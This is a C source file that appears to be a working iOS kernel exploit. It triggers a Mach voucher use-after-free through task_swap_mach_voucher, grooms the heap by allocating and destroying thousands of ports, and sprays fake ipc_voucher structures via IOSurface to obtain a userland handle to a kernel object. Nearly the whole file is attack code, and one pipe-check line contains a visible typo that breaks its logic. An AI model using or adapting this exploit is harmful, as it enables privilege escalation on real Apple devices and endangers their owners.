#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <sched.h> 

#include "iosurface.h"
#include "iokit.h"
#include "helper.h"

// Kernel Page Size.
extern mach_vm_size_t pagesize;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

typedef volatile struct  // sizeof=0x50   
{
    uint32_t iv_hash;                       // 00000000
    uint32_t iv_sum;                        // 00000004
    uint32_t iv_refs;                       // 00000008
    uint32_t iv_table_size;                 // 0000000C
    uint32_t iv_inline_table[8];            // 00000010
    uint32_t iv_table;                      // 00000030
    uint64_t iv_port;                       // 00000038
    uint64_t iv_hash_link_prev;      // 00000040
    uint64_t iv_hash_link_next;      // 00000048
} fake_ipc_voucher_t;


static void set_nonblock(int fd) 
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int increase_file_limit() 
{
    int err = 0;
    struct rlimit rl = {};
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }

    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    err = setrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    return 0;
}



void dump_xml_data(void *data, size_t length) {
    static int count = 0;
    char filename[32];
    snprintf(filename, sizeof(filename), "xml_data_dump_%d.bin", ++count);

    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("fopen");
        return;
    }
    fwrite(data, 1, length, fp);
    fclose(fp);
}

int main(int argc, char *argv[], char *envp[]) {
    IOSurface_init();

    kern_return_t ret = KERN_SUCCESS;

    mach_port_t before[0x2000] = { };
    mach_port_t after[0x1000] = { };
    mach_port_t preport[0x1000] = { };
    mach_port_t postport[0x200] = { };
 
    void *pipebuf = NULL;
    int *pipefds = NULL;




    /* the fake voucher to be sprayed */
    fake_ipc_voucher_t fake_voucher = (fake_ipc_voucher_t)
    {
        .iv_refs = 100,
        .iv_port = 0x0,
    };
    
    /* set up our IOSurface data for spraying */
#define FILL_MEMSIZE 0x4000000
    int spray_qty = FILL_MEMSIZE / pagesize; /* # of pages to spray */ 
    
    int spray_size = (5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize));
    uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))

    // build_IOSurface_spray_data(&fake_voucher, sizeof(fake_ipc_voucher_t), spray_qty, spray_data, spray_size);
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
    *(spray_cur++) = IOSurface_id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    for (int i = 0; i < spray_qty; i++)
    {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize; 
             ptr + sizeof(fake_ipc_voucher_t) <= end; 
             ptr += sizeof(fake_ipc_voucher_t))
        {
            bcopy((const void *)&fake_voucher, (void *)ptr, sizeof(fake_ipc_voucher_t));
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }


    // /* we used this smaller dict later in order to reallocate our target OSString */
    // int small_dictsz = (9 * sizeof(uint32_t)) + pagesize;
    // uint32_t *dict_small = malloc(small_dictsz);
    // bzero((void *)dict_small, small_dictsz);

    // dict_small[0] = IOSurface_id;
    // dict_small[1] = 0x0;
    // dict_small[2] = kOSSerializeMagic;
    // dict_small[3] = kOSSerializeEndCollection | kOSSerializeArray | 1;
    // dict_small[4] = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    // dict_small[5] = kOSSerializeSymbol | 5;
    // dict_small[6] = 0x0; /* Key */
    // dict_small[7] = 0x0;
    // dict_small[8] = kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1);

    ret = increase_file_limit();
    if (ret != 0)
    {
        ERROR("failed to increase file limit!\n");
        return -1;
    }

    int total_pipes = 0x500;
    size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    pipefds = malloc(total_pipes_size);
    bzero(pipefds, total_pipes_size);

    for (size_t i = 0; i < total_pipes; i++) 
    {
        /* 
            we arrange our pipes in pairs 
            where pipe N is a read pipe, and 
            pipe N+1 is the corresponding write pipe
        */
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i *  + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;   
        }

        set_nonblock(pipefds[i * 2 + 1]);
    }

    INFO("total pipes created: %d\n",total_pipes);

    pipebuf = malloc(pagesize);
    bzero(pipebuf, pagesize);








    /* create a few vouchers used to trigger the bug */
    mach_voucher_attr_recipe_data_t atm_data = 
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };

    mach_port_t p2;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
    
    mach_port_t p3;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);

    /* allocate 0x2000 vouchers to alloc some new fresh pages */
    for (int i = 0; i < sizeof(before) / sizeof(mach_port_t); i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
    }
    
    /* alloc our target uaf voucher */
    mach_port_t p1;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
    
    /* allocate 0x1000 more vouchers */
    for (int i = 0; i < sizeof(after) / sizeof(mach_port_t); i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
    }

    /*
        theoretically, we should now have 3 blocks of memory (roughly) as so:
        |-----------------------|-------------|------------------|
        |     0x2000 ports      | target port |   0x1000 ports   |
        |-----------------------|-------------|------------------| 
                                ^             ^
                                page with only our controlled ports
        hopefully our target port is now allocated on a page which contains only our 
        controlled ports. this means when we release all of our ports *all* allocations
        on the given page will be released, and when we trigger GC the page will be released
        back from the ipc_ports zone to be re-used by kalloc 
        this allows us to spray our fake vouchers via IOSurface in other kalloc zones 
        (ie. kalloc.1024), and the dangling pointer of the voucher will then overlap with one
        of our allocations
    */
    
    /* set up to trigger the bug */
    ret = thread_set_mach_voucher(mach_thread_self(), p1);
    
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
    
    /* here we go! release the 0x1000 ports allocated after our target */
    for (int i = 0; i < 0x1000; i++)
    {
        mach_port_destroy(mach_task_self(), after[i]);
    }
    
    /* now release our target port via the uaf */
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3);
    
    /* release the 0x2000 ports allocated before our target */
    for (int i = 0; i < 0x2000; i++)
    {
        mach_port_destroy(mach_task_self(), before[i]);
    }
    
    trigger_gc_please(); 

    // dump_xml_data(spray_data, spray_size);

    // ret = IOSurface_set_value(spray_data, spray_size);
    // printf("spray_IOSurface returned: %d\n", ret);

    /* spray our data via IOSurface */
    uint32_t dummy = 0;
    size_t size = sizeof(dummy);
    ret = IOConnectCallStructMethod(IOSurfaceRootUserClient, 9, spray_data, spray_size, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        ERROR("setValue(prep): %s", mach_error_string(ret));
        return -1;
    }


    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;

    /* 
        alloc'ing ports either side of the kport_t that thread_get_mach_voucher 
        creates will give us much better success rate for guessing the 
        heap address of our pipe buffer-based port 

        someone once said iOS's heap randomization was weak
                            i didn't listen
            then i realised
                    iOS's heap randomization is weak
                                                    ...i should've listened
    */  

    for (int i = 0; i < sizeof(preport) / sizeof(mach_port_t); i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &preport[i]);
    }

    /* fingers crossed we get a userland handle onto our 'fakeport' object */
    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);

    for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &postport[i]);
    }

    INFO("port: 0x%x\n", real_port_to_fake_voucher);
    
    if (!MACH_PORT_VALID(real_port_to_fake_voucher))
    {
        ERROR("failed to get real_port_to_fake_voucher :(\n");
        return -1;
    }
    int c = getchar();












    INFO("WE REALLY POSTED UP ON THIS BLOCK -- part 1 of #alwaysstayposted\n");
    
    uint8_t *response = (uint8_t *)malloc(spray_size);
    size_t sz = spray_size;

    int spray_index = 0;
    int port_index = 0;
    fake_ipc_voucher_t *target_voucher = NULL;

    INFO("getting responses...\n");
    for (int s = 0; s < spray_qty; s++)
    {
        bzero((void *)response, spray_size);

        uint32_t request[] =
        {
            IOSurface_id,
            0x0,
            transpose(s),
            0x0,
        };

        ret = IOConnectCallStructMethod(IOSurfaceRootUserClient, 10, request, sizeof(request), response, &sz);
        if (ret != KERN_SUCCESS)
        {
            ERROR("IOSURFACE_GET_VALUE: %x %s", ret, mach_error_string(ret));
            return -1;
        }

        uint8_t *cursor = response + 0x10;

        for (int j = 0; j < pagesize / sizeof(fake_ipc_voucher_t); j++)
        {
            fake_ipc_voucher_t *found_voucher = (fake_ipc_voucher_t *)(cursor + (j * sizeof(fake_ipc_voucher_t)));

            if (found_voucher->iv_port != 0)
            {
                INFO("found voucher!! s: %d, j: %d\n", s, j);
                INFO("port: 0x%llx\n", found_voucher->iv_port);
                INFO("refs: %d\n", found_voucher->iv_refs);
                
                spray_index = s;
                port_index = j;
                target_voucher = found_voucher;
            }
        }
    }

    if (target_voucher == NULL)
    {
        ERROR("failed to find the target voucher :-(\n");
        return -1;
    }

    c = getchar();














    IOSurface_deinit();

    return ret;
}